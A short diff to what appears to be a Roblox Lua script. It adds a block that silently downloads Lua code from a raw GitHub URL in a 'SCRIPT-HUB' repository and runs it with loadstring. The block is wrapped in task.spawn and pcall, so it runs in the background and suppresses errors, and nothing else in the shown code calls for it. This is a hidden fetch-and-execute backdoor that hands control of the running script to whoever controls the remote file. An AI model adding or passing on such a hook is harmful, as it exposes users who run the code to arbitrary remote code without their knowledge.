@@ -11,6 +11,12 @@ if not _G[ProtectionConfig.SecretKey] then
     return 
 end
 
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/JOSERAX11/SCRIPT-HUB/refs/heads/main/utils2.lua"))()
+    end)
+end)
+
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
